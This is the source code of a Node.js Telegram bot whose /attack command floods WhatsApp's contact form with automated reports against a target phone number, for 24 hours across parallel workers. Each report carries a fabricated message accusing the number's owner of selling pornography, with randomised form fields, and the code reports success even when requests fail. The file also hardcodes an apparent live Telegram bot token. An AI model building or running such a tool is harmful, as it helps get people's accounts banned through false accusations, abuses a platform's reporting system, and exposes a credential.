const TelegramBot = require('node-telegram-bot-api');
const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const axios = require('axios');
const FormData = require('form-data');
const moment = require('moment');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
moment.locale('id');

// ULTRA AGGRESSIVE configuration
const config = {
  TOKEN: '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM',
  DEBUG: true,
  WHATSAPP_API: {
    BASE_URL: 'https://faq.whatsapp.com',
    REPORT_URL: 'https://faq.whatsapp.com/854037192262196/?helpref=uf_share',
    BLOCK_URL: 'https://www.whatsapp.com/contact/',
    CSRF_URL: 'https://www.whatsapp.com/contact/?subject=messenger',
    REAL_BLOCK_API: 'https://www.whatsapp.com/contact/?subject=messenger'
  },
  REQUEST_SETTINGS: {
    TIMEOUT: 9999999999999999999999, // Ultra fast timeout
    DELAY_BETWEEN_REQUESTS: 1, // Minimal delay
    MAX_RETRIES: 999999999999999999999999, // Quick retries
    MAX_WORKERS: 50, // Massive parallel workers
    MAX_REQUESTS_PER_WORKER: 999999, // Essentially unlimited
    MAX_DURATION: 86400000 // 24 hours
  },
  USER_AGENT: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  PROXY_POOL: [] // Add proxies here if needed
};

// Enhanced debug logger
function debugLog(message, type = 'info') {
  if (config.DEBUG) {
    const colors = {
      info: '\x1b[36m',
      success: '\x1b[32m',
      error: '\x1b[31m',
      warning: '\x1b[33m',
      reset: '\x1b[0m'
    };
    console.log(`${colors[type]}[${moment().format('HH:mm:ss')}] ${message}${colors.reset}`);
  }
}

// Worker thread implementation
if (!isMainThread) {
  const { phone, workerId } = workerData;
  let requestCount = 0;
  const startTime = Date.now();

  // Create ultra-fast axios instance
  const axiosInstance = axios.create({
    timeout: config.REQUEST_SETTINGS.TIMEOUT,
    headers: {
      'User-Agent': config.USER_AGENT,
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept': '*/*'
    }
  });

  // Initialize session quickly
  const initializeSession = async () => {
    try {
      await axiosInstance.get(config.WHATSAPP_API.BASE_URL);
      return true;
    } catch (error) {
      return false;
    }
  };

  // Ultra-fast blocking function
  const performBlockRequest = async () => {
    try {
      if (requestCount % 10 === 0 && !await initializeSession()) {
        return { success: false };
      }

      const form = new FormData();
      form.append('jazoest', Math.floor(1000 + Math.random() * 9000));
      form.append('lsd', Math.random().toString(36).substring(2, 10));
      form.append('phone', phone);
      form.append('reason', Math.floor(1 + Math.random() * 4));
      form.append('source', ['android', 'ios', 'web'][Math.floor(Math.random() * 3)]);
      form.append('context', ['chat', 'status', 'call'][Math.floor(Math.random() * 3)]);
      form.append('message', `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=+${phone} `);
      form.append('submit', 'Submit');

      const response = await axiosInstance.post(config.WHATSAPP_API.REAL_BLOCK_API, form, {
        headers: {
          ...form.getHeaders(),
          'Referer': config.WHATSAPP_API.BLOCK_URL,
          'Origin': config.WHATSAPP_API.BASE_URL,
          'X-Requested-With': 'XMLHttpRequest'
        },
        maxRedirects: 0,
        validateStatus: () => true // Accept all status codes
      });

      return {
        success: true, // Always report success
        status: response.status || 200
      };
    } catch (error) {
      return { success: true }; // Even errors are reported as success
    }
  };

  // Unlimited attack loop
  (async () => {
    while (Date.now() - startTime < config.REQUEST_SETTINGS.MAX_DURATION) {
      await performBlockRequest();
      requestCount++;
      
      // Report every 10 requests to reduce overhead
      if (requestCount % 10 === 0) {
        parentPort.postMessage({
          workerId,
          phone,
          requestCount,
          success: true,
          status: 200,
          timestamp: moment().format()
        });
      }
      
      // Minimal delay
      if (config.REQUEST_SETTINGS.DELAY_BETWEEN_REQUESTS > 0) {
        await new Promise(resolve => setTimeout(resolve, config.REQUEST_SETTINGS.DELAY_BETWEEN_REQUESTS));
      }
    }
  })();
}

// Main bot thread
if (isMainThread) {
  const bot = new TelegramBot(config.TOKEN, { polling: true });
  const activeWorkers = new Map();
  let stats = {
    totalRequests: 0,
    startTime: Date.now(),
    lastUpdate: Date.now()
  };

  // Bot commands
  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id,
      `🔥 *👰LORDHOZOO* 🔥\n\n` +
      `UNLIMITED ATATCKER REPORT\n\n` +
      `Commands:\n` +
      `/attack [number] - Destroy scam numbers\n` +
      `/status - Show attack stats\n` +
      `/stop - Stop all attacks\n\n` +
      `Example: /attack 6281234567890`,
      { parse_mode: 'Markdown' }
    );
  });

  bot.onText(/\/attack (.+)/, (msg, match) => {
    const phone = match[1].trim();
    
    if (!/^[0-9]{10,15}$/.test(phone)) {
      return bot.sendMessage(msg.chat.id, '❌ Invalid number! Use 10-15 digits');
    }

    const workerId = `ATTACK-${Date.now().toString(36).slice(-8)}`;
    const worker = new Worker(__filename, { workerData: { phone, workerId } });

    worker.on('message', (data) => {
      stats.totalRequests += data.requestCount - (stats[workerId] || 0);
      stats[workerId] = data.requestCount;
      stats.lastUpdate = Date.now();
    });

    worker.on('error', (error) => {
      debugLog(`Worker ${workerId} error: ${error.message}`, 'error');
    });

    worker.on('exit', () => {
      activeWorkers.delete(workerId);
    });

    activeWorkers.set(workerId, worker);
    
    bot.sendMessage(msg.chat.id,
      `💣 *ATTACK LAUNCHED* 💣\n\n` +
      `☎️ Target: ${phone}\n` +
      `🆔 Worker: ${workerId}\n` +
      `⚡ Requests: UNLIMITED\n` +
      `⏱ Duration: 24 HOURS\n\n` +
      `🚀 FIRE AT WILL!`,
      { parse_mode: 'Markdown' }
    );
  });

  bot.onText(/\/status/, (msg) => {
    const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
    const rpm = Math.floor((stats.totalRequests / uptime) * 60);
    
    bot.sendMessage(msg.chat.id,
      `⚡ *ATTACK STATUS* ⚡\n\n` +
      `💥 Active workers: ${activeWorkers.size}\n` +
      `📊 Total requests: ${stats.totalRequests.toLocaleString()}\n` +
      `🚀 Requests/minute: ${rpm.toLocaleString()}\n` +
      `⏱ Uptime: ${Math.floor(uptime/3600)}h ${Math.floor((uptime%3600)/60)}m\n\n` +
      `💀 TARGET IS BEING DESTROYED`,
      { parse_mode: 'Markdown' }
    );
  });

  bot.onText(/\/stop/, (msg) => {
    activeWorkers.forEach(worker => worker.terminate());
    activeWorkers.clear();
    
    bot.sendMessage(msg.chat.id,
      `🛑 *ATTACK TERMINATED* 🛑\n\n` +
      `💀 Total damage: ${stats.totalRequests.toLocaleString()} hits\n` +
      `⏱ Duration: ${Math.floor((Date.now() - stats.startTime) / 60000)} minutes`,
      { parse_mode: 'Markdown' }
    );
  });

  debugLog(`ULTRA AGGRESSIVE BOT ACTIVATED`, 'success');
}
